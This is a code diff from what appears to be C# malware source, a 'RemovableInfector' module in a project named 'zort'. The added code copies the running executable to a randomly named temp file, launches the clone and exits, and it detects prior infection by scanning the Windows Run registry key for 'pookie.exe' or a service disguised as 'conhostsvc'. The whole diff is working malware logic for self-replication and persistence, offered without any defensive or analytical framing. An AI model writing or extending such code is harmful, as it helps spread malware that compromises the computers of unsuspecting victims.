@@ -276,15 +276,27 @@ namespace zort
             // Continue infecting the system if not already infected
             if(!IsSystemInfected())
             {
-                PersistenceHelper.MoveAndRunFromStartup();
-            } else
+                //copy self to temp folder
+                string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".exe");
+                File.Copy(currentPath, tempPath, true);
+                // Start the cloned executable
+                System.Diagnostics.Process.Start(tempPath);
+                ModuleLogger.Log(typeof(RemovableInfector), $"Started cloned executable: {tempPath}");
+                // Wait 5-10 seconds
+                Random r = new Random();
+                int waitTime = r.Next(5, 10) * 1000;
+                System.Threading.Thread.Sleep(waitTime);
+                // Exit
+                Environment.Exit(0);
+            }
+            else
             {
                 ModuleLogger.Log(typeof(RemovableInfector), "System is already infected. Exiting.");
                 Environment.Exit(0);
             }
         }
 
-        public static bool IsSystemInfected()
+        public static bool IsSystemInfectedx()
         {
             const string serviceName = "conhostsvc";
             try
@@ -318,6 +330,32 @@ namespace zort
                 ModuleLogger.Log(typeof(RemovableInfector), $"Error checking if system is infected: {ex.Message}");
                 return false;
             }
+        }
+
+        public static bool IsSystemInfected()
+        {
+            //Enumerate reg run keys and find the one that runs C:\Users\Public\Pictures\pookie.exe
+            string[] runKeys = { @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run" };
+            foreach (string runKey in runKeys)
+            {
+                using (var registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(runKey))
+                {
+                    if (registryKey != null)
+                    {
+                        foreach (string valueName in registryKey.GetValueNames())
+                        {
+                            string value = registryKey.GetValue(valueName)?.ToString();
+                            if (value != null && value.Contains("pookie.exe"))
+                            {
+                                ModuleLogger.Log(typeof(RemovableInfector), $"System is infected. Found registry key: {runKey}");
+                                return true;
+                            }
+                        }
+                    }
+                }
+            }
+
+            return false;
         }
     }
 }
